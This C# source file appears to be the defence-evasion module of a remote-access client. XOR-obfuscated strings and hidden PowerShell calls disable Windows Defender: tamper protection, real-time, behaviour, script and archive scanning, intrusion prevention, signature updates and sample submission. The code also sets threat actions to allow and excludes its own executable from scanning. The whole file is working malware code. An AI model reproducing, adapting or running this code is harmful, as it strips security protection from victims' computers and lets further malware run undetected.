using System.Diagnostics;
using System.Security.Principal;
using System.Text;
using Microsoft.Win32;

namespace Client
{
	internal class Ektelesths
	{
		public static void Run()
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				Ektelesths.RegistryEdit(AlphaAndOmega.BCutEncrypt("YEL^]KXOVGcixeyel~V]cdne}y*NolodnoxVLok~\u007fxoy") ?? "", AlphaAndOmega.BCutEncrypt("^kgzoxZxe~oi~ced"), "0");
				Ektelesths.RegistryEdit(AlphaAndOmega.BCutEncrypt("YEL^]KXOVZefcicoyVGcixeyel~V]cdne}y*Nolodnox") ?? "", AlphaAndOmega.BCutEncrypt("NcykhfoKd~cYzs}kxo"), "1");
				Ektelesths.RegistryEdit(AlphaAndOmega.BCutEncrypt("YEL^]KXOVZefcicoyVGcixeyel~V]cdne}y*NolodnoxVXokf'^cgo*Zxe~oi~ced") ?? "", AlphaAndOmega.BCutEncrypt("NcykhfoHobk|cexGedc~excdm"), "1");
				Ektelesths.RegistryEdit(AlphaAndOmega.BCutEncrypt("YEL^]KXOVZefcicoyVGcixeyel~V]cdne}y*NolodnoxVXokf'^cgo*Zxe~oi~ced") ?? "", AlphaAndOmega.BCutEncrypt("NcykhfoEdKiioyyZxe~oi~ced"), "1");
				Ektelesths.RegistryEdit(AlphaAndOmega.BCutEncrypt("YEL^]KXOVZefcicoyVGcixeyel~V]cdne}y*NolodnoxVXokf'^cgo*Zxe~oi~ced") ?? "", AlphaAndOmega.BCutEncrypt("NcykhfoYikdEdXokf~cgoOdkhfo"), "1");
				Ektelesths.CheckAspida();
			}
		}

		public static void RegistryEdit(string regPath, string name, string value)
		{
			try
			{
				using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree);
				if (registryKey == null)
				{
					Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
				}
				else if (registryKey.GetValue(name) != value)
				{
					registryKey.SetValue(name, value, RegistryValueKind.DWord);
				}
			}
			catch
			{
			}
		}

		public static void CheckAspida()
		{
			Process process = new Process
			{
				StartInfo = new ProcessStartInfo
				{
					FileName = Ektelesths.BCutEncrypt("ze}oxyboff"),
					Arguments = Ektelesths.BCutEncrypt("Mo~'GzZxoloxodio*'|oxheyo"),
					UseShellExecute = false,
					RedirectStandardOutput = true,
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				}
			};
			process.Start();
			while (!process.StandardOutput.EndOfStream)
			{
				string text = process.StandardOutput.ReadLine();
				if (text.Contains(AlphaAndOmega.BCutEncrypt("NcykhfoXokf~cgoGedc~excdm") ?? "") && text.Contains("False"))
				{
					Ektelesths.RunPS(Ektelesths.BCutEncrypt("Yo~'GzZxoloxodio*'NcykhfoXokf~cgoGedc~excdm*.~x\u007fo"));
				}
				else if (text.Contains(AlphaAndOmega.BCutEncrypt("NcykhfoHobk|cexGedc~excdm") ?? "") && text.Contains("False"))
				{
					Ektelesths.RunPS(Ektelesths.BCutEncrypt("Yo~'GzZxoloxodio*'NcykhfoHobk|cexGedc~excdm*.~x\u007fo"));
				}
				else if (text.Contains(AlphaAndOmega.BCutEncrypt("NcykhfoHfeiaK~Lcxy~Yood") ?? "") && text.Contains("False"))
				{
					Ektelesths.RunPS(Ektelesths.BCutEncrypt("Yo~'GzZxoloxodio*'NcykhfoHfeiaK~Lcxy~Yood*.~x\u007fo"));
				}
				else if (text.Contains(AlphaAndOmega.BCutEncrypt("NcykhfoCEK\\Zxe~oi~ced") ?? "") && text.Contains("False"))
				{
					Ektelesths.RunPS(Ektelesths.BCutEncrypt("Yo~'GzZxoloxodio*'NcykhfoCEK\\Zxe~oi~ced*.~x\u007fo"));
				}
				else if (text.Contains(AlphaAndOmega.BCutEncrypt("NcykhfoZxc|kisGeno") ?? "") && text.Contains("False"))
				{
					Ektelesths.RunPS(Ektelesths.BCutEncrypt("Yo~'GzZxoloxodio*'NcykhfoZxc|kisGeno*.~x\u007fo"));
				}
				else if (text.Contains(AlphaAndOmega.BCutEncrypt("Ycmdk~\u007fxoNcykhfo_znk~oEdY~kx~\u007fz]c~be\u007f~Odmcdo") ?? "") && text.Contains("False"))
				{
					Ektelesths.RunPS(Ektelesths.BCutEncrypt("Yo~'GzZxoloxodio*'Ycmdk~\u007fxoNcykhfo_znk~oEdY~kx~\u007fz]c~be\u007f~Odmcdo*.~x\u007fo"));
				}
				else if (text.Contains(AlphaAndOmega.BCutEncrypt("NcykhfoKxibc|oYikddcdm") ?? "") && text.Contains("False"))
				{
					Ektelesths.RunPS(Ektelesths.BCutEncrypt("Yo~'GzZxoloxodio*'NcykhfoKxibc|oYikddcdm*.~x\u007fo"));
				}
				else if (text.Contains(AlphaAndOmega.BCutEncrypt("NcykhfoCd~x\u007fycedZxo|od~cedYsy~og") ?? "") && text.Contains("False"))
				{
					Ektelesths.RunPS(Ektelesths.BCutEncrypt("Yo~'GzZxoloxodio*'NcykhfoCd~x\u007fycedZxo|od~cedYsy~og*.~x\u007fo"));
				}
				else if (text.Contains(AlphaAndOmega.BCutEncrypt("NcykhfoYixcz~Yikddcdm") ?? "") && text.Contains("False"))
				{
					Ektelesths.RunPS(Ektelesths.BCutEncrypt("Yo~'GzZxoloxodio*'NcykhfoYixcz~Yikddcdm*.~x\u007fo"));
				}
				else if (text.Contains(AlphaAndOmega.BCutEncrypt("Y\u007fhgc~YkgzfoyIedyod~") ?? "") && !text.Contains("2"))
				{
					Ektelesths.RunPS(Ektelesths.BCutEncrypt("Yo~'GzZxoloxodio*'Y\u007fhgc~YkgzfoyIedyod~*8"));
				}
				else if (text.Contains(AlphaAndOmega.BCutEncrypt("GKZYXozex~cdm") ?? "") && !text.Contains("0"))
				{
					Ektelesths.RunPS(Ektelesths.BCutEncrypt("Yo~'GzZxoloxodio*'GKZYXozex~cdm*:"));
				}
				else if (text.Contains(AlphaAndOmega.BCutEncrypt("Bcmb^bxok~Nolk\u007ff~Ki~ced") ?? "") && !text.Contains("6"))
				{
					Ektelesths.RunPS(Ektelesths.BCutEncrypt("Yo~'GzZxoloxodio*'Bcmb^bxok~Nolk\u007ff~Ki~ced*<*'Lexio"));
				}
				else if (text.Contains(AlphaAndOmega.BCutEncrypt("Genoxk~o^bxok~Nolk\u007ff~Ki~ced") ?? "") && !text.Contains("6"))
				{
					Ektelesths.RunPS(Ektelesths.BCutEncrypt("Yo~'GzZxoloxodio*'Genoxk~o^bxok~Nolk\u007ff~Ki~ced*<"));
				}
				else if (text.Contains(AlphaAndOmega.BCutEncrypt("Fe}^bxok~Nolk\u007ff~Ki~ced") ?? "") && !text.Contains("6"))
				{
					Ektelesths.RunPS(Ektelesths.BCutEncrypt("Yo~'GzZxoloxodio*'Fe}^bxok~Nolk\u007ff~Ki~ced*<"));
				}
				else if (text.Contains(AlphaAndOmega.BCutEncrypt("Yo|oxo^bxok~Nolk\u007ff~Ki~ced") ?? "") && !text.Contains("6"))
				{
					Ektelesths.RunPS(Ektelesths.BCutEncrypt("Yo~'GzZxoloxodio*'Yo|oxo^bxok~Nolk\u007ff~Ki~ced*<"));
				}
			}
			Ektelesths.RunPS(Ektelesths.BCutEncrypt("Knn'GzZxoloxodio'Orif\u007fycedOr~odyced*") + "\"" + Process.GetCurrentProcess().MainModule.FileName + "\"");
		}

		public static void RunPS(string args)
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				FileName = Ektelesths.BCutEncrypt("ze}oxyboff"),
				Arguments = args,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			};
			process.Start();
		}

		public static string BCutEncrypt(string str)
		{
			char c = '\n';
			StringBuilder stringBuilder = new StringBuilder();
			char[] array = str.ToCharArray();
			for (int i = 0; i < array.Length; i++)
			{
				stringBuilder.Append((char)(array[i] ^ c));
			}
			return stringBuilder.ToString();
		}
	}
}
